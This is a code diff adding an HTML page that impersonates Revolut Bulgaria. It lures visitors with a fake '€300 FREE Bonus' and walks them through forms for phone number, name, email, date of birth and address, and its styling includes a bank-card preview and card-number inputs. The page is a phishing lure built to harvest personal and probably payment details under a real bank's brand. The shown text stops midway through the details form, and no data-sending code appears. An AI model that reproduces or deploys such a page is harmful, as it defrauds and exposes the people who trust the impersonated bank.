@@ -1,0 +1,1363 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Revolut Bulgaria - Get €300 Bonus</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        revolut: {
+                            blue: '#0075EB',
+                            dark: '#0A0A0A',
+                            card: '#1A1A1A',
+                            accent: '#00D4AA',
+                            purple: '#8B5CF6',
+                            pink: '#EC4899'
+                        }
+                    },
+                    backgroundImage: {
+                        'gradient-radial': 'radial-gradient(var(--tw-gradient-stops))',
+                        'revolut-gradient': 'linear-gradient(135deg, #0075EB 0%, #8B5CF6 50%, #EC4899 100%)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        
+        /* ===== PAGE SYSTEM - FIXED ===== */
+        .page-section {
+            display: none;
+            min-height: 100vh;
+            width: 100%;
+        }
+        .page-section.active {
+            display: block;
+        }
+        
+        /* ===== OFFER BANNER ===== */
+        .offer-banner {
+            position: fixed;
+            top: 64px;
+            left: 0;
+            right: 0;
+            z-index: 999;
+            background: linear-gradient(90deg, #0075EB, #8B5CF6, #EC4899, #0075EB);
+            background-size: 300% 100%;
+            animation: bannerScroll 8s linear infinite;
+            padding: 10px 0;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        @keyframes bannerScroll {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 300% 50%; }
+        }
+        .banner-track {
+            display: inline-block;
+            animation: marquee 20s linear infinite;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+        .banner-text {
+            display: inline-block;
+            padding: 0 40px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #fff;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== NAV ===== */
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* ===== FORM STYLES ===== */
+        .form-container {
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .form-box {
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+        }
+        .form-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .form-header h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+        .form-header p {
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+        }
+        .progress-bar {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 32px;
+            justify-content: center;
+        }
+        .progress-dot {
+            width: 32px;
+            height: 4px;
+            border-radius: 2px;
+            background: rgba(255,255,255,0.1);
+            transition: all 0.3s;
+        }
+        .progress-dot.active {
+            background: linear-gradient(135deg, #0075EB, #8B5CF6);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 8px;
+        }
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(255,255,255,0.08);
+            color: #fff;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s;
+            outline: none;
+        }
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: #0075EB;
+            box-shadow: 0 0 0 3px rgba(0,117,235,0.15);
+            background: rgba(255,255,255,0.12);
+        }
+        .form-group input::placeholder {
+            color: rgba(255,255,255,0.3);
+        }
+        .form-group input.error {
+            border-color: #ef4444;
+        }
+        .error-msg {
+            color: #ef4444;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+        .phone-row {
+            display: flex;
+            gap: 12px;
+        }
+        .country-select-wrapper {
+            position: relative;
+            flex: 1;
+        }
+        .country-select-wrapper select {
+            appearance: none;
+            padding-right: 30px;
+            cursor: pointer;
+        }
+        .country-select-wrapper::after {
+            content: '▼';
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+            pointer-events: none;
+        }
+        .country-code-display {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 12px;
+            padding: 14px 16px;
+            min-width: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            color: #0075EB;
+            font-size: 15px;
+        }
+        .continue-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            background: linear-gradient(135deg, #0075EB, #8B5CF6);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,117,235,0.3);
+        }
+        .continue-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0,117,235,0.4);
+        }
+
+        /* ===== POPUP ===== */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(12px);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .popup-overlay.active {
+            display: flex;
+        }
+        .popup-box {
+            background: rgba(20, 20, 40, 0.98);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 20px;
+            padding: 32px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            animation: popupIn 0.3s ease;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        @keyframes popupIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .popup-box h3 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: #fff;
+        }
+        .popup-box p {
+            color: rgba(255,255,255,0.7);
+            font-size: 16px;
+            margin-bottom: 28px;
+        }
+        .popup-buttons {
+            display: flex;
+            gap: 12px;
+        }
+        .popup-btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .popup-btn.cancel {
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+        .popup-btn.cancel:hover {
+            background: rgba(255,255,255,0.15);
+        }
+        .popup-btn.confirm {
+            background: linear-gradient(135deg, #0075EB, #8B5CF6);
+            color: #fff;
+        }
+        .popup-btn.confirm:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        /* ===== SUCCESS POPUP ===== */
+        .success-popup-box {
+            background: rgba(20, 20, 40, 0.98);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 24px;
+            padding: 48px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            animation: popupIn 0.5s ease;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #00D4AA, #0075EB);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 36px;
+            animation: successPop 0.5s ease;
+            box-shadow: 0 10px 30px rgba(0,212,170,0.3);
+        }
+        @keyframes successPop {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        .success-popup-box h2 {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: #fff;
+        }
+        .success-popup-box p {
+            color: rgba(255,255,255,0.7);
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 32px;
+        }
+        .got-it-btn {
+            background: linear-gradient(135deg, #0075EB, #8B5CF6);
+            color: #fff;
+            padding: 16px 48px;
+            border-radius: 32px;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,117,235,0.3);
+        }
+        .got-it-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,117,235,0.4);
+        }
+
+        /* ===== BONUS BADGE ===== */
+        .bonus-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, #0075EB, #8B5CF6);
+            padding: 8px 20px;
+            border-radius: 24px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(0,117,235,0.4); }
+            50% { box-shadow: 0 0 0 10px rgba(0,117,235,0); }
+        }
+
+        /* ===== CARD PREVIEW ===== */
+        .card-preview {
+            width: 100%;
+            max-width: 360px;
+            height: 220px;
+            margin: 0 auto 28px;
+            position: relative;
+            border-radius: 20px;
+            padding: 28px;
+            overflow: hidden;
+            background: linear-gradient(135deg, #0ea5e9 0%, #3b82f6 30%, #1d4ed8 60%, #1e3a8a 100%);
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            box-shadow: 0 20px 60px rgba(59, 130, 246, 0.3), 0 0 0 1px rgba(255,255,255,0.1);
+            font-family: 'Courier New', monospace;
+        }
+        .card-preview::before {
+            content: '';
+            position: absolute;
+            top: -40%;
+            right: -20%;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(255,255,255,0.12) 0%, transparent 60%);
+            border-radius: 50%;
+        }
+        .card-preview::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            left: -10%;
+            width: 250px;
+            height: 250px;
+            background: radial-gradient(circle, rgba(14, 165, 233, 0.2) 0%, transparent 60%);
+            border-radius: 50%;
+        }
+        .card-shine-effect {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 60%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.8s ease;
+            z-index: 5;
+            pointer-events: none;
+        }
+        .card-preview:hover .card-shine-effect {
+            left: 150%;
+        }
+        .card-top-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #0ea5e9, #3b82f6, #8b5cf6, #0ea5e9);
+            z-index: 2;
+        }
+        .card-chip-gold {
+            width: 44px;
+            height: 32px;
+            background: linear-gradient(135deg, #d4af37 0%, #f4d03f 30%, #d4af37 60%, #b8860b 100%);
+            border-radius: 8px;
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.3);
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+        .card-chip-gold::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 10%;
+            right: 10%;
+            height: 1px;
+            background: rgba(0,0,0,0.2);
+            transform: translateY(-50%);
+        }
+        .card-chip-gold::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: 15%;
+            bottom: 15%;
+            width: 1px;
+            background: rgba(0,0,0,0.2);
+            transform: translateX(-50%);
+        }
+        .card-chip-inner-gold {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60%;
+            height: 40%;
+            border: 1px solid rgba(0,0,0,0.15);
+            border-radius: 4px;
+        }
+        .card-number-display {
+            font-size: 22px;
+            letter-spacing: 3px;
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 2;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            font-weight: 500;
+            color: rgba(255,255,255,0.95);
+            min-height: 28px;
+        }
+        .card-bottom-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+            z-index: 2;
+        }
+        .card-label-small {
+            font-size: 9px;
+            text-transform: uppercase;
+            opacity: 0.6;
+            margin-bottom: 4px;
+            letter-spacing: 1.5px;
+            color: rgba(255,255,255,0.8);
+        }
+        .card-value-small {
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            color: rgba(255,255,255,0.95);
+        }
+        .card-logo-area {
+            text-align: right;
+        }
+        .card-logo-text {
+            font-size: 20px;
+            font-weight: 800;
+            font-style: italic;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            color: rgba(255,255,255,0.95);
+            line-height: 1;
+        }
+        .card-expiry-area {
+            margin-bottom: 4px;
+        }
+        .card-expiry-label-small {
+            font-size: 8px;
+            text-transform: uppercase;
+            opacity: 0.5;
+            letter-spacing: 1px;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 2px;
+        }
+        .card-expiry-value-small {
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            color: rgba(255,255,255,0.95);
+        }
+        .card-contactless-icon {
+            position: absolute;
+            top: 28px;
+            right: 28px;
+            width: 22px;
+            height: 22px;
+            z-index: 2;
+            opacity: 0.5;
+        }
+        .card-contactless-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: rgba(255,255,255,0.9);
+        }
+
+        /* Card Badges */
+        .card-badges {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .card-badge {
+            padding: 10px 24px;
+            border-radius: 24px;
+            font-size: 13px;
+            font-weight: 700;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 0.5px;
+        }
+        .card-badge.vip {
+            background: linear-gradient(135deg, rgba(255,215,0,0.15), rgba(255,215,0,0.05));
+            border-color: rgba(255,215,0,0.4);
+            color: #ffd700;
+        }
+        .card-badge.vip.active {
+            background: linear-gradient(135deg, #ffd700, #ffb700);
+            color: #1a1a2e;
+            box-shadow: 0 0 25px rgba(255,215,0,0.3);
+        }
+        .card-badge.premium {
+            background: rgba(255,255,255,0.05);
+            border-color: rgba(255,255,255,0.2);
+            color: rgba(255,255,255,0.7);
+        }
+        .card-badge.premium:hover {
+            border-color: rgba(255,255,255,0.4);
+            color: #fff;
+        }
+        .card-badge.premium.active {
+            background: linear-gradient(135deg, #e2e8f0, #94a3b8);
+            color: #1e293b;
+            box-shadow: 0 0 25px rgba(148,163,184,0.3);
+        }
+        .card-inputs {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 12px;
+        }
+    </style>
+</head>
+<body class="bg-revolut-dark text-white antialiased">
+
+    <!-- Navigation -->
+    <nav class="fixed top-0 w-full z-50 glass border-b border-white/10 transition-all duration-300" id="navbar">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <div class="flex items-center gap-2">
+                    <div class="w-8 h-8 bg-revolut-gradient rounded-lg flex items-center justify-center font-bold text-white">R</div>
+                    <span class="text-xl font-bold tracking-tight">Revolut</span>
+                </div>
+                <div class="hidden md:flex items-center space-x-8">
+                    <a href="#" class="text-sm text-gray-300 hover:text-white transition">Personal</a>
+                    <a href="#" class="text-sm text-gray-300 hover:text-white transition">Business</a>
+                    <a href="#" class="text-sm text-gray-300 hover:text-white transition">Kids & Teens</a>
+                    <a href="#" class="text-sm text-gray-300 hover:text-white transition">Company</a>
+                    <button onclick="goToPage('phone-page')" class="bg-white text-black px-5 py-2 rounded-full text-sm font-semibold hover:bg-gray-200 transition">Get Started</button>
+                </div>
+                <button onclick="goToPage('phone-page')" class="md:hidden bg-white text-black px-4 py-2 rounded-full text-sm font-semibold">Get Started</button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Scrolling Offer Banner -->
+    <div class="offer-banner">
+        <div class="banner-track">
+            <span class="banner-text">🎉 Get €300 FREE Bonus in Bulgaria! Limited Time Offer!</span>
+            <span class="banner-text">💳 Apply for VIP Card & Get Instant Rewards!</span>
+            <span class="banner-text">🚀 Zero Fees on International Transfers!</span>
+            <span class="banner-text">🔒 Secure Banking with 24/7 Protection!</span>
+            <span class="banner-text">🎉 Get €300 FREE Bonus in Bulgaria! Limited Time Offer!</span>
+            <span class="banner-text">💳 Apply for VIP Card & Get Instant Rewards!</span>
+            <span class="banner-text">🚀 Zero Fees on International Transfers!</span>
+            <span class="banner-text">🔒 Secure Banking with 24/7 Protection!</span>
+        </div>
+    </div>
+
+    <!-- ===== PAGE 1: HOME ===== -->
+    <div id="home-page" class="page-section active">
+        <section class="relative pt-32 pb-20 px-4 overflow-hidden min-h-screen bg-revolut-dark">
+            <div class="absolute inset-0 bg-gradient-radial from-blue-900/20 via-transparent to-transparent pointer-events-none"></div>
+            <div class="max-w-7xl mx-auto">
+                <div class="grid lg:grid-cols-2 gap-12 items-center">
+                    <div class="space-y-6">
+                        <div class="bonus-badge">🇧🇬 Exclusive Bulgaria Offer</div>
+                        <h1 class="text-5xl md:text-7xl font-bold leading-tight">
+                            Get <span class="bg-revolut-gradient bg-clip-text text-transparent">€300</span><br>
+                            Free Bonus
+                        </h1>
+                        <p class="text-lg text-gray-400 max-w-lg">
+                            Join Revolut in Bulgaria and receive €300 welcome bonus. The all-in-one money app that lets you spend, send, and invest smarter.
+                        </p>
+                        <div class="flex flex-col sm:flex-row gap-4">
+                            <button onclick="goToPage('phone-page')" class="bg-revolut-gradient text-white px-8 py-4 rounded-full font-semibold text-lg hover:opacity-90 transition shadow-lg shadow-blue-500/25">
+                                Get Bonus Now →
+                            </button>
+                            <button class="border border-white/20 px-8 py-4 rounded-full font-semibold text-lg hover:bg-white/5 transition">
+                                Learn More
+                            </button>
+                        </div>
+                        <div class="flex items-center gap-4 text-sm text-gray-500">
+                            <span class="flex items-center gap-1">⭐ 4.8 App Store</span>
+                            <span class="flex items-center gap-1">⭐ 4.7 Google Play</span>
+                        </div>
+                    </div>
+                    <div class="relative">
+                        <div class="relative z-10">
+                            <div class="bg-gradient-to-br from-blue-600 to-purple-600 rounded-3xl p-1 shadow-2xl shadow-blue-500/20">
+                                <div class="bg-revolut-card rounded-3xl p-6 space-y-4">
+                                    <div class="flex justify-between items-center">
+                                        <span class="text-gray-400 text-sm">Total Balance</span>
+                                        <button class="text-gray-400 hover:text-white">
+                                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
+                                        </button>
+                                    </div>
+                                    <div class="text-3xl font-bold">£6,012</div>
+                                    <div class="flex gap-2">
+                                        <div class="bg-white/10 rounded-xl p-3 flex-1 text-center">
+                                            <div class="text-xs text-gray-400">Add money</div>
+                                            <div class="text-lg">➕</div>
+                                        </div>
+                                        <div class="bg-white/10 rounded-xl p-3 flex-1 text-center">
+                                            <div class="text-xs text-gray-400">Transfer</div>
+                                            <div class="text-lg">↗️</div>
+                                        </div>
+                                        <div class="bg-white/10 rounded-xl p-3 flex-1 text-center">
+                                            <div class="text-xs text-gray-400">Exchange</div>
+                                            <div class="text-lg">💱</div>
+                                        </div>
+                                        <div class="bg-white/10 rounded-xl p-3 flex-1 text-center">
+                                            <div class="text-xs text-gray-400">More</div>
+                                            <div class="text-lg">⋯</div>
+                                        </div>
+                                    </div>
+                                    <div class="space-y-2">
+                                        <div class="flex justify-between text-sm">
+                                            <span class="text-gray-400">This month</span>
+                                            <span class="text-revolut-accent">+£1,240</span>
+                                        </div>
+                                        <div class="h-2 bg-white/10 rounded-full overflow-hidden">
+                                            <div class="h-full bg-revolut-gradient w-3/4 rounded-full"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="absolute -top-10 -right-10 w-72 h-72 bg-blue-500/20 rounded-full blur-3xl"></div>
+                        <div class="absolute -bottom-10 -left-10 w-72 h-72 bg-purple-500/20 rounded-full blur-3xl"></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="py-20 px-4 bg-white/5">
+            <div class="max-w-7xl mx-auto text-center">
+                <h2 class="text-3xl md:text-4xl font-bold mb-4">Why Choose Revolut?</h2>
+                <p class="text-gray-400 text-center mb-12 max-w-2xl mx-auto">Get more from your money with powerful features designed for modern life.</p>
+                <div class="grid md:grid-cols-3 gap-6">
+                    <div class="glass rounded-2xl p-6 hover:bg-white/5 transition group">
+                        <div class="w-12 h-12 bg-blue-500/20 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition">💰</div>
+                        <h3 class="text-lg font-semibold mb-2">€300 Welcome Bonus</h3>
+                        <p class="text-gray-400 text-sm">Sign up in Bulgaria and get €300 instantly credited to your account after verification.</p>
+                    </div>
+                    <div class="glass rounded-2xl p-6 hover:bg-white/5 transition group">
+                        <div class="w-12 h-12 bg-purple-500/20 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition">💳</div>
+                        <h3 class="text-lg font-semibold mb-2">VIP & Premium Cards</h3>
+                        <p class="text-gray-400 text-sm">Exclusive metal cards with cashback, lounge access, and higher ATM limits.</p>
+                    </div>
+                    <div class="glass rounded-2xl p-6 hover:bg-white/5 transition group">
+                        <div class="w-12 h-12 bg-green-500/20 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition">🌍</div>
+                        <h3 class="text-lg font-semibold mb-2">Zero Fees on Transfers</h3>
+                        <p class="text-gray-400 text-sm">Send money internationally with no hidden fees and real exchange rates.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer class="border-t border-white/10 py-12 px-4 mt-20">
+            <div class="max-w-7xl mx-auto grid md:grid-cols-4 gap-8 text-sm text-gray-400">
+                <div>
+                    <div class="flex items-center gap-2 mb-4">
+                        <div class="w-6 h-6 bg-revolut-gradient rounded flex items-center justify-center font-bold text-white text-xs">R</div>
+                        <span class="text-white font-semibold">Revolut</span>
+                    </div>
+                    <p>One app, all things money.</p>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-3">Products</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:text-white transition">Accounts</a></li>
+                        <li><a href="#" class="hover:text-white transition">Cards</a></li>
+                        <li><a href="#" class="hover:text-white transition">Investments</a></li>
+                        <li><a href="#" class="hover:text-white transition">Crypto</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-3">Company</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:text-white transition">About</a></li>
+                        <li><a href="#" class="hover:text-white transition">Careers</a></li>
+                        <li><a href="#" class="hover:text-white transition">Blog</a></li>
+                        <li><a href="#" class="hover:text-white transition">Contact</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-3">Legal</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:text-white transition">Privacy</a></li>
+                        <li><a href="#" class="hover:text-white transition">Terms</a></li>
+                        <li><a href="#" class="hover:text-white transition">Cookies</a></li>
+                    </ul>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- ===== PAGE 2: PHONE ===== -->
+    <div id="phone-page" class="page-section">
+        <div class="pt-24 pb-12 px-4 min-h-screen flex items-center justify-center bg-revolut-dark">
+            <div class="form-container">
+                <div class="form-box">
+                    <div class="form-header">
+                        <h2>Enter your phone</h2>
+                        <p>We'll need this to contact you about your bonus</p>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-dot active"></div>
+                        <div class="progress-dot"></div>
+                        <div class="progress-dot"></div>
+                        <div class="progress-dot"></div>
+                    </div>
+                    <div class="form-group">
+                        <label>Country</label>
+                        <div class="phone-row">
+                            <div class="country-select-wrapper">
+                                <select id="country-select" onchange="updateCountryCode()">
+                                    <option value="">Select Country</option>
+                                    <option value="+359" selected>🇧🇬 Bulgaria</option>
+                                    <option value="+44">🇬🇧 United Kingdom</option>
+                                    <option value="+1">🇺🇸 United States</option>
+                                    <option value="+49">🇩🇪 Germany</option>
+                                    <option value="+33">🇫🇷 France</option>
+                                    <option value="+39">🇮🇹 Italy</option>
+                                    <option value="+34">🇪🇸 Spain</option>
+                                    <option value="+31">🇳🇱 Netherlands</option>
+                                    <option value="+41">🇨🇭 Switzerland</option>
+                                    <option value="+43">🇦🇹 Austria</option>
+                                    <option value="+32">🇧🇪 Belgium</option>
+                                    <option value="+45">🇩🇰 Denmark</option>
+                                    <option value="+46">🇸🇪 Sweden</option>
+                                    <option value="+47">🇳🇴 Norway</option>
+                                    <option value="+358">🇫🇮 Finland</option>
+                                    <option value="+48">🇵🇱 Poland</option>
+                                    <option value="+420">🇨🇿 Czech Republic</option>
+                                    <option value="+36">🇭🇺 Hungary</option>
+                                    <option value="+30">🇬🇷 Greece</option>
+                                    <option value="+40">🇷🇴 Romania</option>
+                                    <option value="+386">🇸🇮 Slovenia</option>
+                                    <option value="+385">🇭🇷 Croatia</option>
+                                    <option value="+421">🇸🇰 Slovakia</option>
+                                    <option value="+370">🇱🇹 Lithuania</option>
+                                    <option value="+371">🇱🇻 Latvia</option>
+                                    <option value="+372">🇪🇪 Estonia</option>
+                                    <option value="+353">🇮🇪 Ireland</option>
+                                    <option value="+352">🇱🇺 Luxembourg</option>
+                                    <option value="+356">🇲🇹 Malta</option>
+                                    <option value="+357">🇨🇾 Cyprus</option>
+                                    <option value="+351">🇵🇹 Portugal</option>
+                                    <option value="+90">🇹🇷 Turkey</option>
+                                    <option value="+7">🇷🇺 Russia</option>
+                                    <option value="+380">🇺🇦 Ukraine</option>
+                                    <option value="+971">🇦🇪 UAE</option>
+                                    <option value="+966">🇸🇦 Saudi Arabia</option>
+                                    <option value="+20">🇪🇬 Egypt</option>
+                                    <option value="+27">🇿🇦 South Africa</option>
+                                    <option value="+91">🇮🇳 India</option>
+                                    <option value="+61">🇦🇺 Australia</option>
+                                    <option value="+64">🇳🇿 New Zealand</option>
+                                    <option value="+81">🇯🇵 Japan</option>
+                                    <option value="+82">🇰🇷 South Korea</option>
+                                    <option value="+86">🇨🇳 China</option>
+                                    <option value="+65">🇸🇬 Singapore</option>
+                                    <option value="+852">🇭🇰 Hong Kong</option>
+                                    <option value="+66">🇹🇭 Thailand</option>
+                                    <option value="+62">🇮🇩 Indonesia</option>
+                                    <option value="+60">🇲🇾 Malaysia</option>
+                                    <option value="+63">🇵🇭 Philippines</option>
+                                    <option value="+84">🇻🇳 Vietnam</option>
+                                    <option value="+55">🇧🇷 Brazil</option>
+                                    <option value="+52">🇲🇽 Mexico</option>
+                                    <option value="+54">🇦🇷 Argentina</option>
+                                    <option value="+56">🇨🇱 Chile</option>
+                                    <option value="+57">🇨🇴 Colombia</option>
+                                    <option value="+51">🇵🇪 Peru</option>
+                                    <option value="+1">🇨🇦 Canada</option>
+                                </select>
+                            </div>
+                            <div class="country-code-display" id="country-code">+359</div>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Phone Number</label>
+                        <input type="tel" id="phone-input" placeholder="Enter phone number" maxlength="15" oninput="validatePhone(this)" onkeypress="return onlyDigits(event)">
+                        <div class="error-msg" id="phone-error">Please enter a valid phone number (digits only)</div>
+                    </div>
+                    <button class="continue-btn" onclick="showConfirmPopup()">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== CONFIRM POPUP ===== -->
+    <div class="popup-overlay" id="confirm-popup">
+        <div class="popup-box">
+            <h3>Is your phone correct?</h3>
+            <p id="confirm-phone-text">+359 </p>
+            <div class="popup-buttons">
+                <button class="popup-btn cancel" onclick="closePopup()">Cancel</button>
+                <button class="popup-btn confirm" onclick="confirmAndProceed()">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== PAGE 3: DETAILS ===== -->
+    <div id="details-page" class="page-section">
+        <div class="pt-24 pb-12 px-4 min-h-screen flex items-center justify-center bg-revolut-dark">
+            <div class="form-container">
+                <div class="form-box">
+                    <div class="form-header">
+                        <h2>Your Details</h2>
+                        <p>We need a few details to set up your account</p>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-dot active"></div>
+                        <div class="progress-dot active"></div>
+                        <div class="progress-dot"></div>
+                        <div class="progress-dot"></div>
+                    </div>
+                    <div class="form-group">
+                        <label>Full Name</label>
+                        <input type="text" id="full-name" placeholder="John Doe" oninput="validateName(this)">
+                        <div class="error-msg" id="name-error">Please enter your full name</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Email Address</label>
+                        <input type="email" id="email" placeholder="john@example.com" oninput="validateEmail(this)" onblur="validateEmail(this)">
+                        <div class="error-msg" id="email-error">Please enter a valid email (must contain @)</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Date of Birth</label>
+                        <input type="date" id="dob" onchange="validateDOB(this)">
+                        <div class="error-msg" id="dob-error">You must be at least 18 years old</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Flat / House Number</label>
